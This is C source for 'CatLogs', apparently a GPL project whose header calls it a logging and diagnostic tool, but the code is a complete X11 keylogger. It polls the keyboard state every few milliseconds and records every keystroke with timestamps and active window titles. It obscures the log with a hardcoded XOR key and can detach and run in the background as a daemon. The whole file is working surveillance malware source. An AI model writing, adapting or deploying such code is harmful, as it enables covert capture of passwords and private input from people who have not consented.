/*
 * CatLogs
 * A local system logging and diagnostic tool.
 * Copyright (C) 2026 Wassim Bolles
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

#include <X11/Xlib.h>
#include <X11/Xutil.h>
#include <X11/keysym.h>
#include <X11/XKBlib.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/utsname.h>
#include <string.h>
#include <signal.h>
#include <fcntl.h>
#include <time.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <errno.h>
#include <libgen.h>

Display *display;
volatile int die = 0;
int log_fd = -1;
char pid_file_path[4096] = {0};
char last_window_name[1024] = {0};

int global_offset = 0;
const char *sec_key = "CatLogsSecKey123";
int sec_key_len = 16;

void
secure_write (int fd, const char *buf, int len)
{
    if (len <= 0) return;
    char *enc = malloc (len);
    if (!enc) return;
    for (int i = 0; i < len; i++)
  {
        enc[i] = buf[i] ^ sec_key[(global_offset + i) % sec_key_len];
    }
    write (fd, enc, len);
    global_offset += len;
    free (enc);
}


void
handle_signal (int s)
{
    die = 1;
}

void
cleanup (void)
{
    if (log_fd >= 0)
  {
        close (log_fd);
        log_fd = -1;
    }
    if (pid_file_path[0] != '\0')
  {
        unlink (pid_file_path);
    }
}

int
bit_index (unsigned char c)
{
    switch (c) {
        case 1:   return 0;
        case 2:   return 1;
        case 4:   return 2;
        case 8:   return 3;
        case 16:  return 4;
        case 32:  return 5;
        case 64:  return 6;
        case 128: return 7;
        default:  return -1;  
    }
}

int
mkdirs (const char *path)
{
    char tmp[4096];
    char *p = NULL;
    size_t len;

    snprintf (tmp, sizeof (tmp), "%s", path);
    len = strlen (tmp);
    if (len == 0) return -1;
    if (tmp[len - 1] == '/') tmp[len - 1] = '\0';

    for (p = tmp + 1; *p; p++)
  {
        if (*p == '/')
  {
            *p = '\0';
            if (mkdir (tmp, 0755) != 0 && errno != EEXIST) return -1;
            *p = '/';
        }
    }
    return mkdir (tmp, 0755) == 0 || errno == EEXIST ? 0 : -1;
}

void
log_key (int fd, const char *keyname, int is_release)
{
    char buf[512];
    time_t now;
    struct tm *tm_info;
    char ts[64];

    time (&now);
    tm_info = localtime (&now);
    strftime (ts, sizeof (ts), "%Y-%m-%dT%H:%M:%S", tm_info);

    int n;
    if (is_release)
  {
        n = snprintf (buf, sizeof (buf), "[%s] <%s released>\n", ts, keyname);
    }
else
  {
        n = snprintf (buf, sizeof (buf), "[%s] %s\n", ts, keyname);
    }

    if (n > 0)
  {
        secure_write (fd, buf, n);
    }
}

const char*
get_key_name (unsigned int keycode, Display *dpy)
{
    KeySym ks = XkbKeycodeToKeysym (dpy, keycode, 0, 0);
    const char *name = XKeysymToString (ks);

    if (name && strlen (name) > 0)
  {
        return name;
    }

    switch (keycode) {
        case 22:  return "BackSpace";
        case 23:  return "Tab";
        case 36:  return "Return";
        case 37:  return "Control_L";
        case 50:  return "Shift_L";
        case 62:  return "Shift_R";
        case 64:  return "Alt_L";
        case 66:  return "Caps_Lock";
        case 67:  return "F1";
        case 68:  return "F2";
        case 69:  return "F3";
        case 70:  return "F4";
        case 71:  return "F5";
        case 72:  return "F6";
        case 73:  return "F7";
        case 74:  return "F8";
        case 75:  return "F9";
        case 76:  return "F10";
        case 95:  return "F11";
        case 96:  return "F12";
        case 9:   return "Escape";
        case 104: return "Return";
        case 105: return "Control_R";
        case 108: return "Alt_R";
        case 133: return "Super_L";
        default:  return NULL;
    }
}

int
daemonize (void)
{
    pid_t pid = fork ();
    if (pid < 0) return -1;
    if (pid > 0) _exit (0); 

    if (setsid () < 0) return -1;

    pid = fork ();
    if (pid < 0) return -1;
    if (pid > 0) _exit (0);

    int devnull = open ("/dev/null", O_RDWR);
    if (devnull >= 0)
  {
        dup2 (devnull, STDIN_FILENO);
        dup2 (devnull, STDOUT_FILENO);
        dup2 (devnull, STDERR_FILENO);
        if (devnull > 2) close (devnull);
    }

    return 0;
}

int
write_pid_file (const char *path)
{
    FILE *f = fopen (path, "w");
    if (!f) return -1;
    fprintf (f, "%d\n", getpid ());
    fclose (f);
    return 0;
}

void
build_pid_path (const char *log_path)
{
    char dir_copy[4096];
    snprintf (dir_copy, sizeof (dir_copy), "%s", log_path);
    char *dir = dirname (dir_copy);
    snprintf (pid_file_path, sizeof (pid_file_path), "%s/keylogger.pid", dir);
}

char*
get_active_window_title (Display *dpy)
{
    Atom actual_type;
    int actual_format;
    unsigned long nitems;
    unsigned long bytes_after;
    unsigned char *prop = NULL;
    Window root = DefaultRootWindow (dpy);
    Atom net_active_window = XInternAtom (dpy, "_NET_ACTIVE_WINDOW", False);

    if (XGetWindowProperty (dpy, root, net_active_window, 0, 1, False, AnyPropertyType,
                           &actual_type, &actual_format, &nitems, &bytes_after, &prop) == Success) {
        if (nitems > 0)
  {
            Window active_window = *((Window*)prop);
            XFree (prop);
            
            Atom net_wm_name = XInternAtom (dpy, "_NET_WM_NAME", False);
            if (XGetWindowProperty (dpy, active_window, net_wm_name, 0, 1024, False, AnyPropertyType,
                                   &actual_type, &actual_format, &nitems, &bytes_after, &prop) == Success) {
                if (nitems > 0 && prop != NULL)
  {
                    char *name = strdup ((char*)prop);
                    XFree (prop);
                    return name;
                }
                if (prop) XFree (prop);
            }
            
            char *window_name = NULL;
            if (XFetchName (dpy, active_window, &window_name) != 0 && window_name != NULL)
  {
                char *name = strdup (window_name);
                XFree (window_name);
                return name;
            }
        }
else
  {
            if (prop) XFree (prop);
        }
    }
    return NULL;
}

void
check_window_change ()
{
    char *title = get_active_window_title (display);
    if (title)
  {
        if (strcmp (title, last_window_name) != 0)
  {
            char buf[1200];
            int n = snprintf (buf, sizeof (buf), "\n[Active Window: %s]\n", title);
            if (n > 0 && log_fd >= 0)
  {
                secure_write (log_fd, buf, n);
            }
            strncpy (last_window_name, title, sizeof (last_window_name) - 1);
            last_window_name[sizeof (last_window_name) - 1] = '\0';
        }
        free (title);
    }
}

int
main (int argc, char *argv[])
{
    
  if (argc >= 2)
  {
      if (strcmp (argv[1], "--version") == 0)
  {
          printf ("keylogger 1.0\n");
          printf ("Copyright (C) 2026 Wassim Bolles\n");
          printf ("License GPLv3+: GNU GPL version 3 or later <https://gnu.org/licenses/gpl.html>.\n");
          printf ("This is free software: you are free to change and redistribute it.\n");
          printf ("There is NO WARRANTY, to the extent permitted by law.\n");
          return 0;
        }
      if (strcmp (argv[1], "--help") == 0)
  {
          printf ("Usage: %s [LOGFILE_PATH] [--daemon]\n", argv[0]);
          printf ("Start the CatLogs keylogger.\n\n");
          printf ("  --daemon       Run in the background as a daemon\n");
          printf ("  --help         Display this help and exit\n");
          printf ("  --version      Output version information and exit\n\n");
          printf ("Report bugs to: <wassim@wassim.tech>.\n");
          return 0;
        }
    }
unsigned char ok[32];
    unsigned char nk[32];
    int i;
    unsigned int keycode;
    int run_daemon = 0;
    char log_path[4096] = {0};
    char dir_for_mkdir[4096] = {0};

    if (argc < 2)
  {
        fprintf (stderr, "%s: Usage: %s <logfile_path> [--daemon]\n", argv[0], argv[0]);
        return 1;
    }

    snprintf (log_path, sizeof (log_path), "%s", argv[1]);

    for (i = 2; i < argc; i++)
  {
        if (strcmp (argv[i], "--daemon") == 0)
  {
            run_daemon = 1;
        }
    }

    {
        char tmp[4096];
        snprintf (tmp, sizeof (tmp), "%s", log_path);
        char *dir = dirname (tmp);
        snprintf (dir_for_mkdir, sizeof (dir_for_mkdir), "%s", dir);
        mkdirs (dir_for_mkdir);
    }

    build_pid_path (log_path);

    if (run_daemon)
  {
        if (daemonize () < 0)
  {
            perror ("keylogger: Failed to daemonize");
            return 2;
        }
    }

    atexit (cleanup);
    signal (SIGTERM, handle_signal);
    signal (SIGINT, handle_signal);
    signal (SIGQUIT, handle_signal);

    if (write_pid_file (pid_file_path) < 0)
  {
        fprintf (stderr, "%s: Failed to write PID file: %s\n", argv[0], pid_file_path);
        return 3;
    }

    log_fd = open (log_path, O_WRONLY | O_CREAT | O_APPEND, 0644);
    if (log_fd < 0)
  {
        perror ("keylogger: Failed to open log file");
        return 4;
    }

    struct stat st;
    if (fstat (log_fd, &st) == 0)
  {
        global_offset = st.st_size;
    }


    display = XOpenDisplay (NULL);
    if (display == NULL)
  {
        const char *msg = "Error: Cannot open X display. Is X11 running?\n";
        if (!run_daemon)
  {
            fprintf (stderr, "%s: %s", argv[0], msg);
        }
        secure_write (log_fd, msg, strlen (msg));
        return 5;
    }

    XQueryKeymap (display, (char *)ok);

    struct utsname sysinfo;
    if (uname (&sysinfo) == 0)
  {
        char startup_msg[256];
        snprintf (startup_msg, sizeof (startup_msg), "--- CatLogs Key Logger Started on Platform: %s %s ---", sysinfo.sysname, sysinfo.release);
        log_key (log_fd, startup_msg, 0);
    }
else
  {
        log_key (log_fd, "--- CatLogs Key Logger Started ---", 0);
    }

    while (!die)
  {
        usleep (5000);  
        XQueryKeymap (display, (char *)nk);

        for (i = 0; i < 32; i++)
  {
            if (nk[i] != ok[i])
  {
                unsigned char changed = nk[i] ^ ok[i];
                int bit = bit_index (changed);

                if (bit < 0)
  {
                   
                    int b;
                    for (b = 0; b < 8; b++)
  {
                        if (changed & (1 << b))
  {
                            keycode = i * 8 + b;
                            const char *name = get_key_name (keycode, display);
                            if (name)
  {
                                int is_release = !(nk[i] & (1 << b));
                                if (!is_release)
  {
                                    check_window_change ();
                                    log_key (log_fd, name, 0);
                                }
                            }
                        }
                    }
                }
else
  {
                    keycode = i * 8 + bit;
                    int is_press = (nk[i] & (1 << bit));
                    const char *name = get_key_name (keycode, display);

                    if (name)
  {
                        if (is_press)
  {
                            check_window_change ();
                            log_key (log_fd, name, 0);
                        }
                    } else if (is_press)
  {
                        check_window_change ();
                        char unknown_buf[32];
                        snprintf (unknown_buf, sizeof (unknown_buf), "[keycode:%u]", keycode);
                        log_key (log_fd, unknown_buf, 0);
                    }
                }

                ok[i] = nk[i];
            }
        }
    }

    log_key (log_fd, "--- CatLogs Key Logger Stopped ---", 0);
    XCloseDisplay (display);

    return 0;
}